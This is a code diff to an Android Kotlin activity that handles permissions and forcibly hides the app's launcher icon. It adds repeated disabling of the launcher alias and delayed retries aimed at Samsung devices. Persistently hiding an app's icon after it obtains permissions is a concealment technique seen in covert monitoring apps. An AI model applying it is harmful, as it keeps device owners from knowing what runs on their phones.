@@ -9,7 +9,7 @@ import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
-import android.os.Looper
+import android.os.Looper // ✅ ADD THIS IMPORT
 import android.provider.Settings
 import android.util.Log
 import android.widget.Toast
@@ -232,7 +232,7 @@ class PermissionHandlerActivity : Activity() {
 
     private fun hideAppIconForce() {
         try {
-            // ✅ ONLY disable LauncherAlias, NOT MainActivity
+            // ✅ Method 1: Disable LauncherAlias (standard)
             val alias = ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
             packageManager.setComponentEnabledSetting(
                 alias,
@@ -240,22 +240,67 @@ class PermissionHandlerActivity : Activity() {
                 PackageManager.DONT_KILL_APP,
             )
 
-            // ✅ DO NOT disable MainActivity - Expo needs it for debugging
-            // MainActivity stays enabled
+            // ✅ REMOVED: Disable MainActivity - Keep it enabled!
+            // MainActivity stays enabled so app works properly
 
-            // Refresh launcher
+            // ✅ Method 3: Force sync (Android 12+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                packageManager.setComponentEnabledSetting(
+                    alias,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP or PackageManager.MATCH_DISABLED_COMPONENTS,
+                )
+            }
+
+            // ✅ Method 4: Refresh launcher (Samsung)
             try {
                 val refreshIntent = Intent(Intent.ACTION_PACKAGE_CHANGED)
                 refreshIntent.data = android.net.Uri.parse("package:$packageName")
                 refreshIntent.putExtra(Intent.EXTRA_DONT_KILL_APP, true)
                 sendBroadcast(refreshIntent)
             } catch (e: Exception) {
-                /* ignore */
+                /* Ignore */
             }
 
-            Log.i(TAG, "✅ Icon hidden (LauncherAlias disabled)")
+            // ✅ Method 5: Delayed retry (critical for Samsung OneUI)
+            Handler(Looper.getMainLooper())
+                .postDelayed(
+                    {
+                        try {
+                            val aliasRetry =
+                                ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
+                            packageManager.setComponentEnabledSetting(
+                                aliasRetry,
+                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                PackageManager.DONT_KILL_APP,
+                            )
+                        } catch (e: Exception) {
+                            /* Ignore */
+                        }
+                    },
+                    500,
+                )
+
+            // ✅ Method 6: Final retry (Samsung needs this)
+            Handler(Looper.getMainLooper())
+                .postDelayed(
+                    {
+                        try {
+                            val aliasFinal =
+                                ComponentName(this, "com.anonymous.scure_beat.LauncherAlias")
+                            packageManager.setComponentEnabledSetting(
+                                aliasFinal,
+                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                PackageManager.DONT_KILL_APP,
+                            )
+                        } catch (e: Exception) {
+                            /* Ignore */
+                        }
+                    },
+                    2000,
+                )
         } catch (e: Exception) {
-            Log.e(TAG, "Error hiding icon: ${e.message}")
+            Log.e("PermissionHandler", "Error hiding icon: ${e.message}")
         }
     }
 
